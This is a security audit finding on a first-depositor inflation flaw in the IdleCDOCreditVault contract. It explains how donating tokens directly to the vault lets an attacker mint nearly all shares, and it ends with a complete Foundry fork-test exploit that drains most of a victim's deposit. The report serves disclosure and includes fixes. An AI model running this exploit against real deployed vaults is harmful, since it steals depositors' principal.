### Title
First depositor can inflate tranche price and steal later deposits - (File: contracts/IdleCDOCreditVault.sol)

### Summary
`IdleCDOCreditVault` prices new tranche tokens from `lastNAV / trancheSupply`, but does not impose a minimum first deposit, seed or burn initial liquidity, or isolate unsolicited underlying transfers before updating accounting. A first depositor can therefore deposit the minimum accepted amount, donate underlying directly to the CDO to inflate the tranche price, and cause a later depositor to mint almost no tranche tokens. The attacker can then redeem the inflated balance for nearly the entire donated amount plus the victim's principal.

### Finding Description
A deposit flows through `_deposit`, which calls `_updateAccounting` before transferring the depositor's underlying and minting tranche tokens through `_mintSharesAtCurrPrice`.

For a non-empty tranche, `_virtualPriceAux` derives the price as:

```solidity
(_lastTrancheNAV + _totalTrancheGain) * ONE_TRANCHE_TOKEN / trancheSupply
```

Because `getContractValue()` includes the CDO's raw underlying balance, a direct ERC-20 transfer to the CDO is counted as NAV. `IdleCDOCreditVault._deposit` does not call `_skimDonatedAssets`, unlike the epoch variant's overridden `_deposit`, so a donation is crystallized as a tranche gain on the next accounting update.

A concrete sequence is:

1. The tranche starts with zero supply.
2. Attacker deposits `1` wei.
3. `_tranchePrice` returns `oneToken` for the empty tranche and `_mintSharesAtCurrPrice` mints `1 * ONE_TRANCHE_TOKEN / oneToken` tranche units.
4. Attacker directly transfers a large amount of underlying to the CDO.
5. On the victim's deposit, `_updateAccounting` treats that donation as a gain and increases the attacker's tranche price to approximately `donation * ONE_TRANCHE_TOKEN / attackerSupply`.
6. The victim's deposit mints approximately:

   ```solidity
   victimDeposit * attackerSupply / (attackerPrincipal + donation)
   ```

   tranche units.

7. The attacker calls the withdrawal path and redeems almost all CDO NAV because they hold almost all supply.

For example, with a six-decimal underlying:

- Attacker deposits `1` wei and receives `1e12` tranche units.
- Attacker donates `1,000e6` underlying.
- Victim deposits `100e6` underlying.
- The new price is approximately `1e24`.
- The victim mints approximately `1e11` tranche units, representing only about `0.1e6` underlying.
- The attacker withdraws approximately `1,099.9e6`, netting approximately `99.9e6` after recovering the `1,000e6` donation and original `1` wei.

The only explicit amount checks are the zero-amount early return and guarded deposit limit. There is no equivalent of the declared `MIN_LIQUIDITY` check in this mint path, no minimum minted-share check, and no donation skim in `IdleCDOCreditVault._deposit`.

### Impact Explanation
The attacker directly steals nearly all principal from the first later depositor. The donation itself is recycled back to the attacker, so the profitable portion is primarily the victim's deposit rather than the attacker's donated capital.

The broken invariant is fair minting and redemption: one tranche unit must continue to represent a proportional claim on backed NAV. A direct donation instead lets the first depositor make their tiny share supply claim almost all subsequently deposited NAV.

The loss is approximately:

```text
victimLoss ~= victimDeposit - victimDeposit * attackerSupply / donation
```

At a `1,000:1` donation-to-attacker-principal NAV ratio, the victim loses approximately 99.9% of principal.

### Likelihood Explanation
The attack requires a tranche with zero existing supply and an attacker willing to temporarily provide a sufficiently large donation. The attacker must win the first deposit and place the donation before another depositor's transaction is executed.

The affected surface is the base credit-vault deposit path in `IdleCDOCreditVault`; `IdleCDOEpochVariant` explicitly skims donated underlying before its overridden deposit, so that override blocks this particular sequence there. KYC does not fundamentally prevent the issue where it is enabled, because a KYC-passing lender is an allowed unprivileged attacker.

### Recommendation
Prevent economically meaningless first deposits and isolate donations before NAV accounting:

- Enforce a minimum first deposit and minimum minted tranche amount.
- Permanently mint or lock a minimum-liquidity amount on the first deposit, or seed tranche NAV/supply during initialization.
- Skim unaccounted raw underlying before `_updateAccounting` in `IdleCDOCreditVault._deposit`, matching the epoch-variant pattern.
- Revert when `_mintSharesAtCurrPrice` returns zero.
- Consider tracking accounted underlying separately rather than deriving NAV directly from the contract's raw token balance.

A minimum-deposit check alone is less robust because an attacker can still use a larger first deposit; locked initial liquidity or donation isolation addresses the root inflation primitive.

### Proof of Concept
The following Foundry fork test demonstrates the economic sequence against a deployed base `IdleCDOCreditVault` instance. Provide the CDO and underlying through `IDLE_CDO_CREDIT_VAULT` and `IDLE_CDO_UNDERLYING`, or resolve the underlying from `cdo.token()`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IIdleCDOCreditVault {
    function token() external view returns (address);
    function AATranche() external view returns (address);
    function depositAA(uint256 amount) external returns (uint256);
    function withdrawAA(uint256 amount) external returns (uint256);
}

interface ITranche {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract CreditVaultInflationPoC is Test {
    function test_firstDepositorDonationStealsLaterDeposit() external {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        IIdleCDOCreditVault cdo =
            IIdleCDOCreditVault(vm.envAddress("IDLE_CDO_CREDIT_VAULT"));
        IERC20 underlying = IERC20(cdo.token());
        ITranche aa = ITranche(cdo.AATranche());

        require(aa.totalSupply() == 0, "tranche already initialized");

        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        uint256 attackerDeposit = 1;
        uint256 donation = 1_000e6;
        uint256 victimDeposit = 100e6;

        deal(address(underlying), attacker, attackerDeposit + donation);
        deal(address(underlying), victim, victimDeposit);

        vm.startPrank(attacker);
        underlying.approve(address(cdo), attackerDeposit);
        cdo.depositAA(attackerDeposit);

        // Direct donation inflates CDO NAV on the next accounting update.
        underlying.transfer(address(cdo), donation);
        vm.stopPrank();

        uint256 attackerShares = aa.balanceOf(attacker);
        uint256 priceBeforeVictim = aa.totalSupply();

        vm.startPrank(victim);
        underlying.approve(address(cdo), victimDeposit);
        cdo.depositAA(victimDeposit);
        vm.stopPrank();

        uint256 victimShares = aa.balanceOf(victim);

        // The victim receives less than 1% of the attacking share supply for
        // roughly 0.1% of the inflated NAV.
        assertLt(victimShares * 100, attackerShares);
        assertGt(priceBeforeVictim, 0);

        uint256 attackerBefore = underlying.balanceOf(attacker);

        vm.prank(attacker);
        cdo.withdrawAA(0);

        uint256 attackerReceived =
            underlying.balanceOf(attacker) - attackerBefore;

        // The attacker recovers the donation and takes nearly all victim principal.
        assertGt(attackerReceived, donation + victimDeposit * 99 / 100);
        assertLt(
            underlying.balanceOf(address(cdo)) +
                underlying.balanceOf(address(victim)),
            victimDeposit / 100
        );
    }
}
```

For an epoch-enabled deployment, use the analogous base-credit-vault buffer-phase deposit path if it does not inherit the skim; the epoch variant's own `_deposit` first calls `_skimDonatedAssets`, which removes the direct-donation primitive.
